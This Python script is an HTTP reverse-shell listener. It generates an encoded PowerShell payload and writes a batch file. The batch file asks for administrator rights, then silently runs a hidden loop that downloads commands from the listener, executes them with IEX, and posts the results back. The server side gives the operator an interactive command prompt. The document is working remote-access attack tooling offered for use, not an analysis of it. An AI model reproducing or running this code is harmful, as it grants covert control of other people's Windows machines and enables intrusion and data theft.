import http.server, socketserver, signal

ADDRESS = "0.0.0.0"
PORT = 8000

GREEN = '\033[38;5;47m'; END = '\033[0m'

payload = f"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($c) -join ' ')}}}}"
e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
print(f"{GREEN}PAYLOAD:{END}")
print (f"powershell -e {e_payload}")

print(f"{GREEN}TESTE- PAYLOAD .bat created {END}")
print("")
f = open("payload.bat", "w")
f.write("@echo off\n")
f.write("net session >nul 2>&1\n")
f.write("if %errorLevel% == 0 (\n")
f.write("  goto start\n")
f.write(") else (\n")
f.write(f"  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n")
f.write(")\n")
f.write(":start\n")
f.write(f"powershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body ([System.Text.Encoding]::UTF8.GetBytes($c) -join ' ')}}}}\"\n")
f.close()

class Http_Shell(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        command_input = input(f'{GREEN}$hell > {END}')
        self.wfile.write(bytes(command_input + '\n', "utf-8"))

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        byte_list = [int(b) for b in post_data.split()]
        byte_seq = bytes(byte_list)
        print(byte_seq.decode('utf-8'))
        
    def log_message(self, format, *args):
        return

def signal_handler(sig, frame):
    print("Closing server ...")
    httpd.server_close()

with socketserver.TCPServer(("", PORT), Http_Shell) as httpd:
    print("Listening on port", PORT)
    print(" ")
    httpd.serve_forever()
    signal.signal(signal.SIGINT, signal_handler)
